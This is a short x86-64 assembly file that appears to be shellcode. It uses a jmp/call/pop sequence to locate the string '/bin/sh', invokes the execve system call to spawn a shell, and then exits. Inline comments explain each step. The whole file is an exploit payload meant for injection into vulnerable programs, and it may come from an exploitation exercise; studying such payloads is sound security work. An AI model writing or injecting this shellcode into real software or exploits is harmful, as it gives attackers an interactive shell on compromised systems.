	.section .text
_start:
	jmp     *27(%rip)
	popq    %rdi
	xor     %r10d, %r10d		#XOR to store 0 to be used later
	movl	%r10d, %edx
	movl	%r10d, %esi
	leal    59(%r10d), %eax		#execve system call
	syscall
	movl	%r10d, %edi
	leal    60(%r10d), %eax		#exit(0) system call
	syscall
	call    *-33(%rip)		#to return the call to the exec call with return addr
	.string "/bin/sh\0"		#The command to executed stored in return addr of call
